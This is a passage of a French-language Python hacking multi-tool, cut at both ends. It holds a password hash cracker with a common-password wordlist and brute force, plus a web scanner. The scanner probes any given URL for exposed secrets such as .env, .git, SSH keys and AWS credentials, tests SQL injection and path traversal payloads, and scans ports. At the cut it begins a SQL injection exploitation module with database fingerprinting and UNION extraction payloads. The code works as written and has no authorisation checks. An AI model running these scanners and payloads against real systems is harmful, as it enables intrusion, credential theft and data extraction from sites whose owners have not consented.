    def ntlm_hash(s):
        try:
            return hashlib.new("md4", s.encode("utf-16-le")).hexdigest()
        except Exception:
            return None

    wordlist = [
        "password", "123456", "12345678", "qwerty", "abc123", "monkey",
        "letmein", "dragon", "111111", "baseball", "iloveyou", "trustno1",
        "1234567", "sunshine", "master", "123123", "welcome", "shadow",
        "ashley", "football", "jesus", "michael", "ninja", "mustang",
        "password1", "password123", "admin", "root", "toor", "test",
        "guest", "user", "changeme", "secret", "azerty", "loulou",
        "soleil", "bonjour", "france", "paris", "marseille",
        "Password1!", "P@ssw0rd", "P@ssword123", "Summer2024!",
        "Winter2024!", "Admin123!", "Welcome1!", "Qwerty123!",
    ]

    try:
        import bcrypt as _bcrypt
    except ImportError:
        _bcrypt = None

    try:
        import crypt as _crypt
    except ImportError:
        _crypt = None

    try:
        from Crypto.Cipher import DES as _DES_MOD
    except ImportError:
        _DES_MOD = None

    def lm_hash(s):
        try:
            if _DES_MOD is None:
                return None
            password = s.upper()[:14]
            if len(password) < 14:
                password += "\0" * (14 - len(password))
                
            def _hash_part(part):
                return _DES_MOD.new(part.encode(), _DES_MOD.MODE_ECB).encrypt(b"KGS!@#$%").hex()
            return _hash_part(password[:7]) + _hash_part(password[7:])
        except Exception:
            return None

    while True:
        clear()
        banner()
        print(f"\n{CYAN}   [ HASH CRACKER ]{RESET}\n")
        print("  1. Identifier un hash")
        print("  2. Casser un hash (wordlist)")
        print("  3. Casser un hash (bruteforce)")
        print("  4. Generer un hash")
        print("  5. Tester un mot de passe contre un hash")
        print("  0. Quitter\n")
        c = input(f"{YELLOW}choix > {RESET}").strip()

        if c == "0":
            return
        elif c == "1":
            h = input(f"{YELLOW}[?]{RESET} hash -> ").strip()
            if h:
                matches = identifier(h)
                print(f"\n{GRAY}Longueur : {len(h)}{RESET}")
                if matches:
                    print(f"{GREEN}Signatures :{RESET}")
                    for m in matches:
                        print(f"  - {m}")
                else:
                    print(f"{YELLOW}(aucune signature reconnue){RESET}")
                pause()
        elif c in ("2", "3"):
            h = input(f"{YELLOW}[?]{RESET} hash -> ").strip()
            if not h:
                continue
            matches = identifier(h)
            algos = [m for m in matches if m in ALGO_MAP or m in ("bcrypt", "sha512crypt", "sha256crypt", "md5crypt")]
            if not algos:
                force = input(f"{YELLOW}[?]{RESET} Forcer md5/sha1/sha256/sha512 -> ").strip().lower()
                if force in ALGO_MAP:
                    algos = [force]
                else:
                    print(f"{RED}[!] Algo non identifie.{RESET}")
                    pause()
                    continue

            if c == "2":
                wl_path = input(f"{YELLOW}[?]{RESET} Wordlist path (vide = interne) -> ").strip()
                words = wordlist
                if wl_path and os.path.isfile(wl_path):
                    try:
                        with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
                            words = [ln.rstrip("\r\n") for ln in f]
                    except Exception:
                        pass

                found = None
                for name in algos:
                    if name == "bcrypt":
                        if not _bcrypt:
                            continue
                        for w in words:
                            try:
                                if _bcrypt.checkpw(w.encode(), h.encode()):
                                    found = (w, name)
                                    break
                            except Exception:
                                continue
                    elif name in ("sha512crypt", "sha256crypt", "md5crypt"):
                        if not _crypt:
                            continue
                        for w in words:
                            try:
                                if _crypt.crypt(w, h) == h:
                                    found = (w, name)
                                    break
                            except Exception:
                                continue
                    else:
                        f = algo_fn(name)
                        if not f:
                            continue
                        for w in words:
                            if f(w) == h:
                                found = (w, name)
                                break
                    if found:
                        break

                if found:
                    print(f"\n{GREEN}[+] TROUVE : {found[0]} (algo: {found[1]}){RESET}")
                else:
                    print(f"\n{RED}[-] Pas trouve.{RESET}")
                pause()
            else:
                try:
                    maxl = int(input(f"{YELLOW}[?]{RESET} Longueur max (2-6) -> ").strip() or "4")
                except ValueError:
                    maxl = 4
                cs = input(f"{YELLOW}[?]{RESET} Charset (defaut a-z0-9) -> ").strip() or string.ascii_lowercase + string.digits
                found = None
                for name in algos:
                    f = algo_fn(name)
                    if not f:
                        continue
                    for n in range(1, maxl + 1):
                        for combo in itertools.product(cs, repeat=n):
                            w = "".join(combo)
                            if f(w) == h:
                                found = (w, name)
                                break
                        if found:
                            break
                    if found:
                        break
                if found:
                    print(f"\n{GREEN}[+] TROUVE : {found[0]} (algo: {found[1]}){RESET}")
                else:
                    print(f"\n{RED}[-] Pas trouve.{RESET}")
                pause()
        elif c == "4":
            pw = input(f"{YELLOW}[?]{RESET} Mot de passe -> ")
            print()
            for a in ["md5", "sha1", "sha256", "sha512", "sha3_256"]:
                print(f"  {a:10} {hashlib.new(a, pw.encode()).hexdigest()}")
            ntl = ntlm_hash(pw)
            if ntl:
                print(f"  {'ntlm':10} {ntl}")
            lm = lm_hash(pw)
            if lm:
                print(f"  {'lm':10} {lm}")
            pause()
        elif c == "5":
            h = input(f"{YELLOW}[?]{RESET} hash -> ").strip()
            pw = input(f"{YELLOW}[?]{RESET} mot de passe a tester -> ")
            matches = identifier(h)
            ok = False
            for name in matches:
                f = algo_fn(name)
                if f and f(pw) == h:
                    print(f"{GREEN}[+] MATCH — {name}{RESET}")
                    ok = True
            for a in ["md5", "sha1", "sha256", "sha512"]:
                if hashlib.new(a, pw.encode()).hexdigest() == h:
                    print(f"{GREEN}[+] MATCH — {a}{RESET}")
                    ok = True
            if not ok:
                print(f"{RED}[-] Aucun match.{RESET}")
            pause()


def option_20():
    clear()
    banner()
    if not _need_requests():
        pause()
        return

    TIMEOUT = 8
    UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124"

    SENSITIVE_PATHS = [
        "/.env", "/.env.local", "/.env.production", "/.env.backup",
        "/.git/HEAD", "/.git/config", "/.gitignore",
        "/.svn/entries", "/.hg/hgrc",
        "/.DS_Store", "/.htaccess", "/.htpasswd", "/.user.ini",
        "/config.php", "/config.yml", "/config.json", "/config.xml",
        "/wp-config.php", "/wp-config.php.bak", "/wp-config.txt",
        "/settings.php", "/settings.py",
        "/backup.zip", "/backup.tar.gz", "/backup.sql",
        "/dump.sql", "/database.sql", "/db.sql",
        "/site.zip", "/www.zip", "/html.zip",
        "/admin", "/admin.php", "/administrator",
        "/wp-admin", "/wp-login.php",
        "/login", "/login.php", "/signin",
        "/phpmyadmin", "/pma", "/adminer.php",
        "/manager/html", "/console",
        "/phpinfo.php", "/info.php", "/test.php",
        "/debug.php", "/debug", "/status",
        "/server-status", "/server-info",
        "/swagger.json", "/openapi.json", "/api-docs",
        "/graphql", "/api/v1", "/api/v2",
        "/package.json", "/composer.json", "/composer.lock",
        "/Dockerfile", "/docker-compose.yml",
        "/.env.example", "/.env.old", "/.env.save",
        "/web.config", "/app.config", "/appsettings.json",
        "/robots.txt", "/sitemap.xml", "/readme.html",
        "/CHANGELOG.txt", "/INSTALL.txt",
        "/xmlrpc.php", "/wp-json/wp/v2/users",
        "/id_rsa", "/id_dsa", "/private.key",
        "/cert.pem", "/.ssh/authorized_keys",
        "/.aws/credentials", "/.npmrc", "/.pypirc",
        "/credentials.txt", "/passwords.txt",
        "/.bash_history", "/.mysql_history",
    ]

    COMMON_PARAMS = ["id", "page", "url", "file", "path", "q", "s", "search", "redirect", "next", "return", "cat", "view"]

    SQLI_PAYLOADS = [
        "'", "\"", "')", "';", "' OR '1'='1", "\" OR \"1\"=\"1",
        "' OR 1=1--", "' OR 1=1#",
    ]
    SQLI_ERRORS = [
        "you have an error in your sql syntax",
        "warning: mysql", "unclosed quotation mark",
        "sqlstate", "syntax error", "microsoft ole db",
        "postgresql", "sqlite error", "ora-0",
    ]

    LFI_PAYLOADS = [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
    ]
    LFI_SIGNATURES = [
        "root:x:0:0:", "[extensions]", "daemon:x:", "bin:x:", "nobody:x:",
    ]

    findings = []
    fl = threading.Lock()

    def add(sev, cat, detail, ev=""):
        with fl:
            findings.append((sev, cat, detail, ev))

    def get(url, allow_redirects=True):
        try:
            return requests.get(url, headers={"User-Agent": UA}, timeout=TIMEOUT,
                                allow_redirects=allow_redirects, verify=False)
        except Exception:
            return None

    def normalize(u):
        u = u.strip()
        if not u:
            return None
        if not u.startswith(("http://", "https://")):
            u = "https://" + u
        return u.rstrip("/")

    def check_headers(headers):
        lh = {k.lower(): v for k, v in headers.items()}
        csp = lh.get("content-security-policy", "").lower()
        if "x-frame-options" not in lh and "frame-ancestors" not in csp:
            add("MEDIUM", "Clickjacking", "No X-Frame-Options / CSP frame-ancestors")
        if "content-security-policy" not in lh:
            add("MEDIUM", "Missing Header", "Content-Security-Policy absent")
        if "strict-transport-security" not in lh:
            add("LOW", "Missing Header", "Strict-Transport-Security absent")
        if "x-content-type-options" not in lh:
            add("LOW", "Missing Header", "X-Content-Type-Options absent")
        if "referrer-policy" not in lh:
            add("LOW", "Missing Header", "Referrer-Policy absent")
        server = headers.get("Server", "")
        if server and any(c.isdigit() for c in server):
            add("LOW", "Info Disclosure", f"Server: {server}")
        powered = headers.get("X-Powered-By", "")
        if powered:
            add("LOW", "Info Disclosure", f"X-Powered-By: {powered}")

    def check_cors(target):
        r = get(target)
        if not r:
            return
        try:
            r2 = requests.get(target, headers={"User-Agent": UA, "Origin": "https://evil.invalid"}, timeout=TIMEOUT, verify=False)
            acao = r2.headers.get("Access-Control-Allow-Origin", "")
            if acao == "*":
                add("MEDIUM", "CORS", "Access-Control-Allow-Origin: *")
            elif "evil.invalid" in acao:
                add("HIGH", "CORS", f"Reflects Origin ({acao})")
        except Exception:
            pass

    def check_ssl(target):
        if not target.startswith("https://"):
            add("MEDIUM", "HTTPS", "Site does not use HTTPS")
            return
        try:
            parsed = urllib.parse.urlparse(target)
            hostname = parsed.hostname
            if not hostname:
                return
            ctx = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as raw:
                with ctx.wrap_socket(raw, server_hostname=hostname) as conn:
                    print(f"{GREEN}[+] TLS : {conn.version()}{RESET}")
        except ssl.SSLCertVerificationError:
            add("HIGH", "SSL Certificate", "Verification failed")
        except Exception:
            pass

    def check_sensitive(target, path):
        r = get(target + path, allow_redirects=False)
        if not r:
            return
        if r.status_code == 200 and r.content:
            ct = r.headers.get("Content-Type", "").lower()
            if "text/html" in ct and len(r.content) < 200:
                return
            size = len(r.content)
            sev = "HIGH" if any(x in path for x in (".env", ".git", "config", "backup", "sql", "key", "credentials", "passwords")) else "MEDIUM"
            add(sev, "Sensitive File", f"{path} ({size} bytes)")

    def check_cms(target):
        r = get(target + "/wp-login.php")
        if r and r.status_code == 200:
            add("INFO", "CMS", "WordPress detecte")
            r = get(target + "/wp-json/wp/v2/users")
            if r and r.status_code == 200:
                try:
                    users = r.json()
                    if isinstance(users, list):
                        names = [u.get("slug") for u in users if u.get("slug")]
                        if names:
                            add("MEDIUM", "WordPress User Enum", f"Users exposes: {', '.join(names[:10])}")
                except Exception:
                    pass
        r = get(target + "/CHANGELOG.txt")
        if r and r.status_code == 200 and "drupal" in r.text.lower():
            add("INFO", "CMS", "Drupal detecte")
        r = get(target + "/phpmyadmin/")
        if r and r.status_code == 200 and "phpmyadmin" in r.text.lower():
            add("MEDIUM", "Admin Panel", "phpMyAdmin accessible")

    def check_sqli(target):
        for param in COMMON_PARAMS[:8]:
            for payload in SQLI_PAYLOADS[:5]:
                url = f"{target}/?{param}={urllib.parse.quote(payload)}"
                r = get(url)
                if not r:
                    continue
                body_lower = r.text.lower() if r.text else ""
                for err in SQLI_ERRORS:
                    if err in body_lower:
                        add("HIGH", "SQL Injection", f"Param '{param}' — erreur SQL",
                            f"Payload: {payload}")
                        return
                if r.status_code == 500:
                    add("MEDIUM", "SQLi (possible)", f"Param '{param}' — HTTP 500",
                        f"Payload: {payload}")
                    return

    def check_lfi(target):
        for param in ("file", "page", "path", "include", "template", "view"):
            for payload in LFI_PAYLOADS:
                url = f"{target}/?{param}={urllib.parse.quote(payload)}"
                r = get(url)
                if not r or not r.text:
                    continue
                body = r.text[:5000]
                for sig in LFI_SIGNATURES:
                    if sig in body:
                        add("HIGH", "LFI", f"Param '{param}' — fichier local lisible",
                            f"Payload: {payload}")
                        return

    def check_http_methods(target):
        try:
            r = requests.options(target, headers={"User-Agent": UA}, timeout=TIMEOUT, verify=False)
            allow = r.headers.get("Allow", "")
            if allow:
                dangerous = [m for m in ("PUT", "DELETE", "TRACE") if m in allow]
                if dangerous:
                    add("MEDIUM", "Dangerous HTTP Methods", f"Allow: {allow}")
        except Exception:
            pass

    def check_ports(target):
        parsed = urllib.parse.urlparse(target)
        host = parsed.hostname
        if not host:
            return
        try:
            ip = socket.gethostbyname(host)
        except Exception:
            return

        COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445,
                        1433, 3306, 3389, 5432, 5900, 6379, 8080, 27017]

        def try_port(p):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                res = s.connect_ex((ip, p))
                s.close()
                return p if res == 0 else None
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            open_ports = [p for p in ex.map(try_port, COMMON_PORTS) if p]

        PORT_NAMES = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            1433: "MSSQL", 3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL",
            5900: "VNC", 6379: "Redis", 8080: "HTTP-alt", 27017: "MongoDB",
        }
        for p in open_ports:
            name = PORT_NAMES.get(p, "unknown")
            sev = "HIGH" if p in (445, 1433, 3306, 3389, 5900, 6379, 27017) else "MEDIUM"
            add(sev, "Open Port", f"{p}/{name}")

    target = input(f"{CYAN}[?] URL -> {RESET}").strip()
    target = normalize(target)
    if not target:
        print(f"{RED}[!] URL invalide.{RESET}")
        pause()
        return

    print(f"\n{CYAN}[*] Scan de {target}...{RESET}\n")

    try:
        import urllib3
        urllib3.disable_warnings()
    except Exception:
        pass

    r = get(target)
    if not r:
        print(f"{RED}[!] Connexion impossible.{RESET}")
        pause()
        return

    print(f"{GREEN}[+] HTTP {r.status_code}{RESET}")

    print(f"{YELLOW}[*] Analyse headers...{RESET}")
    check_headers(r.headers)

    print(f"{YELLOW}[*] Test CORS...{RESET}")
    check_cors(target)

    print(f"{YELLOW}[*] Test SSL/TLS...{RESET}")
    check_ssl(target)

    print(f"{YELLOW}[*] Test methodes HTTP...{RESET}")
    check_http_methods(target)

    print(f"{YELLOW}[*] Detection CMS...{RESET}")
    check_cms(target)

    print(f"{YELLOW}[*] Tests SQL Injection...{RESET}")
    check_sqli(target)

    print(f"{YELLOW}[*] Tests LFI...{RESET}")
    check_lfi(target)

    print(f"{YELLOW}[*] Scan {len(SENSITIVE_PATHS)} fichiers sensibles...{RESET}")
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        list(ex.map(lambda p: check_sensitive(target, p), SENSITIVE_PATHS))

    print(f"{YELLOW}[*] Scan des ports...{RESET}")
    check_ports(target)

    print(f"\n\n{CYAN}{BOLD}═════════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   RAPPORT DE SCAN — {target}{RESET}")
    print(f"{CYAN}{BOLD}═════════════════════════════════════════════════════{RESET}\n")

    sev_order = {"HIGH": 0, "MEDIUM": 1, "LOW": 2, "INFO": 3}
    findings.sort(key=lambda x: sev_order.get(x[0], 9))

    counters = {"HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for sev, cat, detail, ev in findings:
        counters[sev] = counters.get(sev, 0) + 1

    SEV_COLOR = {"HIGH": RED, "MEDIUM": YELLOW, "LOW": BLUE_LIGHT, "INFO": GRAY}

    for sev, cat, detail, ev in findings:
        color = SEV_COLOR.get(sev, GRAY)
        print(f"{color}[{sev:<6}]{RESET} {BOLD}{cat:<28}{RESET} : {detail}")
        if ev:
            print(f"{GRAY}         └─ {ev}{RESET}")

    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"{RED}[+] HIGH    : {counters['HIGH']}{RESET}")
    print(f"{YELLOW}[+] MEDIUM  : {counters['MEDIUM']}{RESET}")
    print(f"{BLUE_LIGHT}[+] LOW     : {counters['LOW']}{RESET}")
    print(f"{GRAY}[+] INFO    : {counters['INFO']}{RESET}")
    print(f"{WHITE}[+] TOTAL   : {len(findings)}{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "WebScanner"
        out_dir.mkdir(parents=True, exist_ok=True)
        host = urllib.parse.urlparse(target).hostname or "target"
        report = out_dir / f"scan_{host}_{int(time.time())}.txt"
        with open(report, "w", encoding="utf-8") as f:
            f.write(f"Scan report for {target}\n")
            f.write(f"Date: {datetime.now().isoformat()}\n")
            f.write("=" * 60 + "\n\n")
            for sev, cat, detail, ev in findings:
                f.write(f"[{sev:<6}] {cat:<28} : {detail}\n")
                if ev:
                    f.write(f"           └─ {ev}\n")
        print(f"\n{GREEN}[+] Rapport : {report}{RESET}")
    except Exception:
        pass

    pause()


# ============================================================
#                  OPTIONS 21 a 40 — stubs
# ============================================================

# ============================================================
#              OPTION 21 — PORT SCANNER
# ============================================================

PORT_RANGES = {
    "1":  ("Top 20 ports",        [21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
                                    443, 445, 993, 995, 1433, 3306, 3389, 5432,
                                    5900, 8080]),
    "2":  ("Top 100 ports",       [7, 9, 13, 21, 22, 23, 25, 26, 37, 53, 79, 80,
                                    81, 88, 106, 110, 111, 113, 119, 135, 139, 143,
                                    144, 179, 199, 389, 427, 443, 444, 445, 465,
                                    513, 514, 515, 543, 544, 548, 554, 587, 631,
                                    646, 873, 990, 993, 995, 1025, 1026, 1027,
                                    1028, 1029, 1080, 1110, 1352, 1433, 1494,
                                    1521, 1701, 1720, 1723, 1755, 1812, 1900,
                                    2000, 2001, 2049, 2121, 2222, 2323, 2375,
                                    2376, 2401, 2483, 2484, 3000, 3128, 3260,
                                    3268, 3269, 3306, 3389, 3690, 4000, 4444,
                                    5000, 5060, 5222, 5432, 5555, 5632, 5900,
                                    5985, 5986, 6000, 6379, 6666, 7001, 7070,
                                    8000, 8008, 8080, 8081, 8443, 8888, 9000,
                                    9090, 9100, 9200, 9300, 10000, 11211, 27017,
                                    27018, 50000]),
    "3":  ("Well-known (1-1024)", list(range(1, 1025))),
    "4":  ("Full range (1-65535)", list(range(1, 65536))),
    "5":  ("Custom",              None),
}

def _scan_port(ip, port, timeout):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        res = s.connect_ex((ip, port))
        if res == 0:
            svc_banner = ""
            try:
                s.settimeout(0.8)
                s.send(b"\r\n")
                data = s.recv(256)
                if data:
                    svc_banner = data.decode("utf-8", errors="ignore").strip().split("\n")[0][:60]
            except Exception:
                pass
            s.close()
            return (port, "open", svc_banner)
        s.close()
        return (port, "closed", "")
    except socket.timeout:
        return (port, "timeout", "")
    except Exception:
        return (port, "closed", "")

SERVICE_NAMES = {
    20: "ftp-data", 21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp",
    53: "dns", 67: "dhcp", 68: "dhcp", 69: "tftp", 80: "http",
    110: "pop3", 111: "rpcbind", 123: "ntp", 135: "msrpc", 137: "netbios-ns",
    138: "netbios-dgm", 139: "netbios-ssn", 143: "imap", 161: "snmp",
    162: "snmptrap", 179: "bgp", 389: "ldap", 443: "https", 445: "microsoft-ds",
    465: "smtps", 514: "syslog", 515: "printer", 548: "afp", 554: "rtsp",
    587: "submission", 631: "ipp", 636: "ldaps", 873: "rsync", 990: "ftps",
    993: "imaps", 995: "pop3s", 1080: "socks", 1433: "mssql", 1521: "oracle",
    1723: "pptp", 2049: "nfs", 2375: "docker", 2376: "docker-tls",
    3306: "mysql", 3389: "rdp", 4444: "metasploit", 5000: "upnp",
    5432: "postgresql", 5900: "vnc", 5985: "winrm-http", 5986: "winrm-https",
    6379: "redis", 6667: "irc", 8000: "http-alt", 8080: "http-proxy",
    8443: "https-alt", 8888: "http-alt", 9000: "http-alt", 9200: "elasticsearch",
    11211: "memcached", 27017: "mongodb", 27018: "mongodb",
}

def option_21():
    clear()
    banner()

    import concurrent.futures

    print(f"\n{CYAN}   [ PORT SCANNER ]{RESET}\n")

    target = input(f"{YELLOW}[?]{RESET} URL ou IP {RED}->{RESET} ").strip()
    if not target:
        print(f"{RED}[!] Cible vide.{RESET}")
        pause()
        return

    target = target.removeprefix("https://").removeprefix("http://").rstrip("/").split("/")[0]
    if ":" in target and not target.count(":") > 1:
        target = target.split(":")[0]

    print(f"{YELLOW}[*] Resolution DNS...{RESET}")
    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror:
        print(f"{RED}[!] Resolution DNS impossible pour '{target}'.{RESET}")
        pause()
        return

    if ip != target:
        print(f"{GREEN}[+] {target} -> {ip}{RESET}")
    else:
        print(f"{GREEN}[+] IP : {ip}{RESET}")

    print(f"\n{CYAN}   PORT RANGES{RESET}\n")
    for key, (label, ports) in PORT_RANGES.items():
        count = len(ports) if ports else "?"
        print(f"  {PINK}({key}){RESET} {label:<24} {GRAY}[{count} ports]{RESET}")

    print()
    range_choice = input(f"{YELLOW}[?]{RESET} Choix (1-5) {RED}->{RESET} ").strip() or "1"

    if range_choice not in PORT_RANGES:
        print(f"{RED}[!] Choix invalide.{RESET}")
        pause()
        return

    label, ports = PORT_RANGES[range_choice]

    if ports is None:
        custom = input(f"{YELLOW}[?]{RESET} Ports (ex: 80,443,8000-8100) {RED}->{RESET} ").strip()
        if not custom:
            print(f"{RED}[!] Aucun port.{RESET}")
            pause()
            return
        ports = []
        for part in custom.split(","):
            part = part.strip()
            if "-" in part:
                try:
                    a, b = part.split("-", 1)
                    a, b = int(a.strip()), int(b.strip())
                    if 1 <= a <= b <= 65535:
                        ports.extend(range(a, b + 1))
                except ValueError:
                    print(f"{YELLOW}[!] Plage ignoree : {part}{RESET}")
            else:
                try:
                    p = int(part)
                    if 1 <= p <= 65535:
                        ports.append(p)
                except ValueError:
                    print(f"{YELLOW}[!] Port ignore : {part}{RESET}")
        if not ports:
            print(f"{RED}[!] Aucun port valide.{RESET}")
            pause()
            return
        ports = sorted(set(ports))
        label = f"Custom ({len(ports)} ports)"

    print(f"\n{CYAN}   TIMEOUT{RESET}\n")
    print(f"  {PINK}(1){RESET} Rapide    {GRAY}(0.3s){RESET}")
    print(f"  {PINK}(2){RESET} Normal    {GRAY}(0.8s){RESET}")
    print(f"  {PINK}(3){RESET} Precis    {GRAY}(1.5s){RESET}")
    print(f"  {PINK}(4){RESET} Custom{RESET}")
    print()
    to_choice = input(f"{YELLOW}[?]{RESET} Choix (1-4) {RED}->{RESET} ").strip() or "2"

    TIMEOUTS = {"1": 0.3, "2": 0.8, "3": 1.5}
    if to_choice == "4":
        try:
            timeout = float(input(f"{YELLOW}[?]{RESET} Timeout en secondes {RED}->{RESET} ").strip())
            if timeout <= 0:
                timeout = 0.8
        except ValueError:
            timeout = 0.8
    else:
        timeout = TIMEOUTS.get(to_choice, 0.8)

    print(f"\n{CYAN}   THREADS{RESET}\n")
    print(f"  {PINK}(1){RESET} 50    {GRAY}(discret){RESET}")
    print(f"  {PINK}(2){RESET} 200   {GRAY}(equilibre){RESET}")
    print(f"  {PINK}(3){RESET} 500   {GRAY}(agressif){RESET}")
    print(f"  {PINK}(4){RESET} 1000  {GRAY}(max){RESET}")
    print()
    th_choice = input(f"{YELLOW}[?]{RESET} Choix (1-4) {RED}->{RESET} ").strip() or "2"

    THREADS = {"1": 50, "2": 200, "3": 500, "4": 1000}
    workers = THREADS.get(th_choice, 200)

    print(f"\n{CYAN}   AFFICHAGE{RESET}\n")
    print(f"  {PINK}(1){RESET} Ouverts uniquement{RESET}")
    print(f"  {PINK}(2){RESET} Tous les ports testes{RESET}")
    print()
    v_choice = input(f"{YELLOW}[?]{RESET} Choix (1-2) {RED}->{RESET} ").strip() or "1"
    verbose = (v_choice == "2")

    print(f"\n{CYAN}   RESUME{RESET}")
    print(f"  {GREEN}Cible     : {WHITE}{target} ({ip}){RESET}")
    print(f"  {GREEN}Plage     : {WHITE}{label}{RESET}")
    print(f"  {GREEN}Ports     : {WHITE}{len(ports)}{RESET}")
    print(f"  {GREEN}Timeout   : {WHITE}{timeout}s{RESET}")
    print(f"  {GREEN}Threads   : {WHITE}{workers}{RESET}")
    print(f"  {GREEN}Affichage : {WHITE}{'tous' if verbose else 'ouverts seulement'}{RESET}")
    print()

    confirm = input(f"{YELLOW}[?]{RESET} Lancer le scan ? (y/n) {RED}->{RESET} ").strip().lower()
    if confirm not in ("y", "yes", "o", "oui"):
        print(f"{YELLOW}[!] Annule.{RESET}")
        pause()
        return

    print(f"\n{CYAN}[*] Scan de {ip} — {len(ports)} ports...{RESET}\n")

    open_ports = []
    closed_count = [0]
    timeout_count = [0]
    done = [0]
    lock = threading.Lock()
    start_time = time.time()
    total = len(ports)

    def worker(port):
        p, status, svc_banner = _scan_port(ip, port, timeout)
        with lock:
            done[0] += 1
            if status == "open":
                open_ports.append((p, svc_banner))
                name = SERVICE_NAMES.get(p, "unknown")
                bstr = f" — {GRAY}{svc_banner}{RESET}" if svc_banner else ""
                sys.stdout.write(
                    f"\r{' ' * 80}\r"
                    f"{CYAN}[+] {p:<6}{RESET} "
                    f"{WHITE}{name:<16}{RESET} "
                    f"{CYAN}OPEN{RESET}{bstr}\n"
                )
                sys.stdout.flush()
            elif status == "timeout":
                timeout_count[0] += 1
                if verbose:
                    sys.stdout.write(f"\r{' ' * 80}\r{GRAY}[-] {p:<6} timeout{RESET}\n")
                    sys.stdout.flush()
            else:
                closed_count[0] += 1
                if verbose:
                    sys.stdout.write(f"\r{' ' * 80}\r{GRAY_DK}[-] {p:<6} closed{RESET}\n")
                    sys.stdout.flush()

            ratio = done[0] / total
            bar_len = 30
            filled = int(bar_len * ratio)
            bar = "█" * filled + "░" * (bar_len - filled)
            pct = int(ratio * 100)
            sys.stdout.write(
                f"\r{' ' * 80}\r"
                f"{PURPLE}[{bar}]{RESET} {WHITE}{pct:3d}%{RESET}  "
                f"{GRAY}{done[0]}/{total}{RESET}  "
                f"{CYAN}open:{len(open_ports)}{RESET}"
            )
            sys.stdout.flush()

    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        list(ex.map(worker, ports))

    elapsed = time.time() - start_time

    print(f"\n\n{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}")
    print(f"{CYAN}{BOLD}   SCAN TERMINE — {ip}{RESET}")
    print(f"{CYAN}{BOLD}═══════════════════════════════════════════════════{RESET}\n")

    if open_ports:
        print(f"{GREEN}{BOLD}   PORTS OUVERTS ({len(open_ports)}){RESET}\n")
        open_ports.sort(key=lambda x: x[0])
        for p, svc_banner in open_ports:
            name = SERVICE_NAMES.get(p, "unknown")
            line = f"  {CYAN}[+]{RESET} {WHITE}{p:<6}{RESET} {PURPLE_LT}{name:<16}{RESET}"
            if svc_banner:
                line += f" {GRAY}{svc_banner}{RESET}"
            print(line)
    else:
        print(f"{YELLOW}   Aucun port ouvert detecte.{RESET}\n")

    print(f"\n{CYAN}   STATS{RESET}")
    print(f"  {GREEN}Ouverts   : {WHITE}{len(open_ports)}{RESET}")
    print(f"  {GRAY}Fermes    : {WHITE}{closed_count[0]}{RESET}")
    print(f"  {GRAY}Timeouts  : {WHITE}{timeout_count[0]}{RESET}")
    print(f"  {GREEN}Duree     : {WHITE}{elapsed:.2f}s{RESET}")
    speed = total / elapsed if elapsed > 0 else 0
    print(f"  {GREEN}Vitesse   : {WHITE}{speed:.0f} ports/s{RESET}")

    try:
        out_dir = Path(_safe_workdir()) / "Output" / "PortScan"
        out_dir.mkdir(parents=True, exist_ok=True)
        safe_host = re.sub(r"[^\w\-.]", "_", target)[:40]
        out_file = out_dir / f"scan_{safe_host}_{int(time.time())}.txt"
        with open(out_file, "w", encoding="utf-8") as f:
            f.write("Port Scan Report\n")
            f.write(f"Target   : {target}\n")
            f.write(f"IP       : {ip}\n")
            f.write(f"Date     : {datetime.now().isoformat()}\n")
            f.write(f"Range    : {label}\n")
            f.write(f"Ports    : {total}\n")
            f.write(f"Timeout  : {timeout}s\n")
            f.write(f"Threads  : {workers}\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"[OPEN PORTS] ({len(open_ports)})\n")
            for p, svc_banner in sorted(open_ports):
                name = SERVICE_NAMES.get(p, "unknown")
                f.write(f"  {p:<6} {name:<16}")
                if svc_banner:
                    f.write(f"  {svc_banner}")
                f.write("\n")
            f.write(f"\n[STATS]\n")
            f.write(f"  Open     : {len(open_ports)}\n")
            f.write(f"  Closed   : {closed_count[0]}\n")
            f.write(f"  Timeouts : {timeout_count[0]}\n")
            f.write(f"  Duration : {elapsed:.2f}s\n")
            f.write(f"  Speed    : {speed:.0f} ports/s\n")
        print(f"\n{GREEN}[+] Rapport : {out_file}{RESET}")
    except Exception as e:
        print(f"{YELLOW}[!] Export impossible : {e}{RESET}")

    pause()

# ============================================================
#              OPTION 22 — SQL INJECTION EXPLOIT
# ============================================================

SQLI_DBMS_FINGERPRINT = [
    ("' AND @@version LIKE '%'--",                  "MySQL/MariaDB"),
    ("' AND 1=CONVERT(int, @@version)--",           "MSSQL"),
    ("' AND 1=CAST(version() AS int)--",            "PostgreSQL"),
    ("' AND 1=dbms_pipe.receive_message('a',0)--",  "Oracle"),
    ("' AND 1=sqlite_version()--",                  "SQLite"),
]

SQLI_EXTRACT_PAYLOADS = {
    "MySQL/MariaDB": {
        "dbs":      "' UNION SELECT GROUP_CONCAT(schema_name),NULL FROM information_schema.schemata-- -",
        "tables":   "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
